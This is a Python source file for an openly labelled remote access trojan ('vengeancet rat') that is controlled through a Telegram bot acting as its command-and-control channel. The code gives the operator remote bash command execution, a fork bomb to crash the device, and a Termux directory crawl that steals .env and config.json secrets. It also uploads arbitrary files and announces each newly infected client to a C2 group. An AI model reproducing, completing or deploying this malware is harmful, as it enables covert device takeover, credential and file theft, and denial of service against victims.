import os
try:
  from telegram import Update
  from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
  )
  from telegram.constants import ParseMode
except ModuleNotFoundError:
  os.system("pip install python-telegram-bot > /dev/null")
from pathlib import Path
from functools import wraps
import subprocess

import uuid
import platform
import secrets
import logging

logging.basicConfig()
log = logging.getLogger(__name__)

shell = None
workdir = Path.cwd()

dirs_blacklist = [
    "node_modules", "__pycache__", ".config", ".npm", ".cargo",
    ".cache", ".termux", str(workdir),
]

def owner_only(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user = update.effective_user
        if user is None or user.id != owner_id:
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def start_shell():
    global shell
    shell = subprocess.Popen(
        ["bash"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

def exec_shell(cmd: str) -> str:
    global shell
    if shell is None or shell.poll() is not None:
        start_shell()

    mark = f"__end_{uuid.uuid4().hex}__"
    shell.stdin.write(cmd + "\n")
    shell.stdin.write(f'printf "\\n{mark}\\n"\n')
    shell.stdin.flush()

    output = []
    while True:
        line = shell.stdout.readline()
        if not line:
            break
        if line.strip() == mark:
            break
        output.append(line)
    return "".join(output)

def stealing_keys(root: str) -> str:
    raw_return = ""
    for dirpath, subs, files in os.walk(root):
        subs[:] = [n for n in subs if n not in dirs_blacklist]
        for name in files:
            if name.endswith(".env") or name == "config.json":
                path = Path(dirpath) / name
                try:
                    raw_return += f"\n--- {path} ---\n"
                    raw_return += path.read_text(encoding="utf-8", errors="ignore")
                except OSError:
                    continue
    return raw_return or "(nada encontrado)"

async def chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        f"Chat ID: `{update.effective_chat.id}`",
        parse_mode=ParseMode.MARKDOWN,
    )

@owner_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"""
<b>vengeancet rat by nullzinx/iwagura</b>
<a href="https://github.com/nullzinx/vengeancet_rat/">github repository</a>
------------------------
| /exec &lt;key&gt; &lt;command&gt;
| /nuke &lt;key&gt;
| /stealing_keys &lt;key&gt;
| /stealing_file &lt;key&gt; &lt;file&gt;
------------------------
""",
        parse_mode=ParseMode.HTML,
    )

@owner_only
async def exec_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or context.args[0] != key:
        await update.message.reply_text("key invalid")
        return

    cmd = " ".join(context.args[1:])
    if not cmd:
        await update.message.reply_text("uso: /exec <key> <comando>")
        return

    try:
        result = exec_shell(cmd)
    except Exception as e:
        result = f"erro: {e}"

    if len(result) > 4000:
        result = result[:4000] + "\n...[truncado]"

    await update.message.reply_text(
        f"[*] COMMAND EXECUTED\n{result or '(sem saída)'}"
    )

@owner_only
async def stealing_keys_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or context.args[0] != key:
        await update.message.reply_text("key invalid")
        return

    keys = stealing_keys("/data/data/com.termux/files/home")
    if len(keys) > 4000:
        keys = keys[:4000] + "\n...[truncado]"
    await update.message.reply_text(keys)

@owner_only
async def fork_bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or context.args[0] != key:
        await update.message.reply_text("key invalid")
        return

    await update.message.reply_text(
        f"[*] tentando derrubar o dispositivo com fork bomb {key}"
    )
    try:
        while True:
            os.fork()
    except OSError:
        pass

@owner_only
async def stealing_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or context.args[0] != key:
        await update.message.reply_text("key invalid")
        return

    path_str = " ".join(context.args[1:])
    if not path_str:
        await update.message.reply_text("uso: /stealing_file <key> <arquivo>")
        return

    path = Path(path_str).expanduser()
    if not path.is_file():
        await update.message.reply_text("file not found")
        return

    with path.open("rb") as f:
        await update.message.reply_document(document=f, filename=path.name)

async def on_startup(app: Application):
    try:
        await app.bot.send_message(
            chat_id=c2_group_id,
            text=(
                "<b>new client connected</b>\n\n"
                f"key: <code>{key}</code>\n"
                "------------------------\n"
                f"OS: {platform.system()} {platform.release()}\n"
                f"Python: {platform.python_version()}\n"
                f"Impl: {platform.python_implementation()}\n"
                "------------------------"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        pass

async def on_shutdown(app: Application):
    try:
        await app.bot.send_message(
            chat_id=c2_group_id,
            text=f"client <code>{key}</code> kill the connection",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        pass 

def main():
    app = (
        Application.builder()
        .token(token)
        .post_init(on_startup)
        .post_shutdown(on_shutdown)
        .connect_timeout(30)
        .read_timeout(30)
        .write_timeout(30)
        .pool_timeout(30)
        .build()
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("id", chat_id))
    app.add_handler(CommandHandler("exec", exec_cmd))
    app.add_handler(CommandHandler("nuke", fork_bomb))
    app.add_handler(CommandHandler("stealing_keys", stealing_keys_cmd))
    app.add_handler(CommandHandler("stealing_file", stealing_file))

    app.run_polling()

if __name__ == "__main__":
    main()
